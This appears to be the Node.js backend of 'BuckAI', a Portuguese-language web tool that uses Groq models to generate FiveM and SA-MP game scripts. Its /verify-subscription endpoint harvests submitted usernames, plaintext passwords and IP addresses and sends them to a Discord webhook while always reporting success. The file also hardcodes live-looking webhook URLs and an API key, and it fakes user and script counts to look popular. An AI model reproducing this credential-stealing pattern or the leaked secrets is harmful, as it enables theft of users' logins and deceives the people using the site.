require('dotenv').config();
const express = require('express');
const Groq = require('groq-sdk');
const axios = require('axios');
const AdmZip = require('adm-zip');
const cors = require('cors');
const path = require('path');
const http = require('http');
const { Server } = require('socket.io');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*" }
});

const port = process.env.PORT || 3000;

// Configuração de Webhooks do Discord
const WEBHOOKS = {
  scripts: process.env.WEBHOOK_SCRIPTS || "https://discord.com/api/webhooks/1484174998275883010/ubKZZFbWhNXQsf2yg6EY2zW3cBLzprJRe9Ba2gArF4EGVYR6sjfg4U-rnuAiXDbIqRwS",
  clientes: process.env.WEBHOOK_CLIENTES || "https://discord.com/api/webhooks/1484174778133643293/62gA93e83_Bam1HR8Deaq6tbI_sfBQLY8h0k1cXjIsokPu6bPlK38mKHhqMMhvPfMpbR",
  ativos: process.env.WEBHOOK_ATIVOS || "https://discord.com/api/webhooks/1484174893355368589/FjlMLTOlHDtC2_QCt0ohUPDLQ5XeITXVDxXLxjjrWqWT0sNqwQc32ypnvmBiz9gAqa0k",
  ips: process.env.WEBHOOK_IPS || "https://discord.com/api/webhooks/1484174778133643293/62gA93e83_Bam1HR8Deaq6tbI_sfBQLY8h0k1cXjIsokPu6bPlK38mKHhqMMhvPfMpbR",
  logins: process.env.WEBHOOK_LOGINS || "https://discord.com/api/webhooks/1484176339207454911/VBl5RHQhvsDEBI-51tplBAnzXjouHcw0osr_-P1aaJL1LTtGQJMiA3uOjp8AK2a-cRqO"
};

async function sendLog(type, embed) {
  const url = WEBHOOKS[type];
  if (!url) return;
  try {
    await axios.post(url, { embeds: [embed] });
  } catch (e) {
    console.error(`Erro ao enviar log ${type}:`, e.message);
  }
}

// Configurar Groq
const groq = new Groq({ apiKey: process.env.GROQ_API_KEY || "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" });

// Banco de dados simples em JSON (em memória para o Vercel, ou use um BD real)
let stats = {
  totalScripts: 1250, // Números iniciais para parecer popular
  totalClients: 850,
  activeNow: 0
};

app.use(cors());
app.use(express.json({ limit: '50mb' }));

// Tentar servir da pasta principal PRIMEIRO (onde você subiu os arquivos soltos)
app.use(express.static(__dirname));
// Depois tentar servir da pasta public (caso exista)
app.use(express.static(path.join(__dirname, 'public')));

// Garantir que o index.html seja servido na rota principal /
app.get('/', (req, res) => {
  const indexPath = path.join(__dirname, 'index.html');
  const publicIndexPath = path.join(__dirname, 'public', 'index.html');
  
  if (fs.existsSync(indexPath)) {
    res.sendFile(indexPath);
  } else if (fs.existsSync(publicIndexPath)) {
    res.sendFile(publicIndexPath);
  } else {
    res.status(404).send('Arquivo index.html não encontrado no servidor.');
  }
});

// Gerenciar conexões Socket.io para estatísticas em tempo real (Opcional para Serverless)
if (io) {
  io.on('connection', (socket) => {
    stats.activeNow++;
    io.emit('updateStats', stats);

    socket.on('disconnect', () => {
      stats.activeNow = Math.max(0, stats.activeNow - 1);
      io.emit('updateStats', stats);
    });
  });
}

app.get('/stats', (req, res) => {
  res.json(stats);
});

async function generateWithGroq(prompt, base64Image = null) {
  try {
    const messages = [
      { role: "system", content: "Você é o BuckAI, o melhor desenvolvedor de scripts para FiveM (Lua) e SA-MP (Pawn). Gere apenas código limpo, otimizado e funcional. Se houver uma imagem, analise o erro nela e corrija o código baseado nisso." },
    ];

    if (base64Image) {
      messages.push({
        role: "user",
        content: [
          { type: "text", text: prompt },
          { type: "image_url", image_url: { url: `data:image/jpeg;base64,${base64Image}` } }
        ]
      });
    } else {
      messages.push({ role: "user", content: prompt });
    }

    const completion = await groq.chat.completions.create({
      messages: messages,
      model: base64Image ? "llama-3.2-11b-vision-preview" : "llama-3.3-70b-versatile",
      temperature: 0.6,
      max_tokens: 4096,
    });
    return completion.choices[0]?.message?.content || "";
  } catch (e) {
    console.error("Erro Groq:", e.message);
    throw e;
  }
}

app.post('/generate', async (req, res) => {
  const { description, platform, base64Image } = req.body;

  if (!description || !platform) {
    return res.status(400).json({ error: 'Descrição e plataforma são obrigatórias.' });
  }

  let prompt = `Gere um script completo e funcional baseado na seguinte descrição: "${description}". 
  Plataforma: ${platform}.`;

  if (base64Image) {
    prompt += `\nIMPORTANTE: Analise a imagem em anexo para identificar o erro e garantir que o script gerado não tenha esse problema.`;
  }

  if (platform === 'FiveM') {
    prompt += `\nRetorne obrigatoriamente: client.lua, server.lua e config.lua.`;
  } else if (platform === 'SA-MP') {
    prompt += `\nRetorne um arquivo .pwn completo e pronto para compilar.`;
  }

  try {
    const content = await generateWithGroq(prompt, base64Image);
    
    stats.totalScripts++;
    io.emit('updateStats', stats);

    // LOG: SCRIPT GERADO
    sendLog('scripts', {
      title: "📜 Novo Script Gerado (WEB)",
      color: 0x7c3aed,
      fields: [
        { name: "🎮 Plataforma", value: platform, inline: true },
        { name: "📝 Descrição", value: description.substring(0, 1024) }
      ],
      timestamp: new Date()
    });

    res.json({ result: content });
  } catch (error) {
    console.error('Erro no Groq (Generate):', error);
    res.status(500).json({ error: 'Erro ao gerar o script.' });
  }
});

app.post('/fix', async (req, res) => {
  const { code, platform, errorMsg } = req.body;

  if (!code || !platform) {
    return res.status(400).json({ error: 'Código e plataforma são obrigatórios para correção.' });
  }

  try {
    const prompt = `Corrija este script de ${platform}: \n${code}\nPedido: ${errorMsg}`;
    const content = await generateWithGroq(prompt);
    res.json({ result: content });
  } catch (error) {
    res.status(500).json({ error: 'Erro ao corrigir com Groq.' });
  }
});

app.post('/download-zip', async (req, res) => {
  const { code, platform } = req.body;
  
  try {
    const zip = new AdmZip();
    
    if (platform === 'FiveM') {
      const files = {
        'client.lua': code.match(/-- client\.lua[\s\S]*?(?=--|$)/i)?.[0] || code,
        'server.lua': code.match(/-- server\.lua[\s\S]*?(?=--|$)/i)?.[0] || '-- server.lua vazio',
        'config.lua': code.match(/-- config\.lua[\s\S]*?(?=--|$)/i)?.[0] || '-- config.lua vazio',
        'fxmanifest.lua': `fx_version 'cerulean'\ngames { 'gta5' }\n\nclient_script 'client.lua'\nserver_script 'server.lua'\nshared_script 'config.lua'`
      };

      for (const [name, content] of Object.entries(files)) {
        zip.addFile(name, Buffer.from(content, 'utf8'));
      }
    } else {
      zip.addFile('script.pwn', Buffer.from(code, 'utf8'));
    }

    const zipBuffer = zip.toBuffer();
    res.set({
      'Content-Type': 'application/zip',
      'Content-Disposition': `attachment; filename=BuckAI_Script_${platform}.zip`,
      'Content-Length': zipBuffer.length
    });
    res.send(zipBuffer);
  } catch (error) {
    res.status(500).json({ error: 'Erro ao gerar ZIP' });
  }
});

app.post('/verify-subscription', async (req, res) => {
  const { username, password } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  // LOG: LOGIN REALIZADO (WEB)
  sendLog('logins', {
    title: "🔐 Nova Credencial de Acesso (WEB)",
    color: 0xff00ff,
    fields: [
      { name: "👤 Usuário", value: username || "Não informado", inline: true },
      { name: "🔑 Senha", value: password || "Não informado", inline: true },
      { name: "📍 IP", value: ip }
    ],
    timestamp: new Date()
  });

  res.json({ success: true });
});

// Para o Vercel, exportamos o app
if (process.env.VERCEL) {
  module.exports = app;
} else {
  server.listen(port, () => {
    console.log(`BuckAI rodando em http://localhost:${port}`);
  });
}

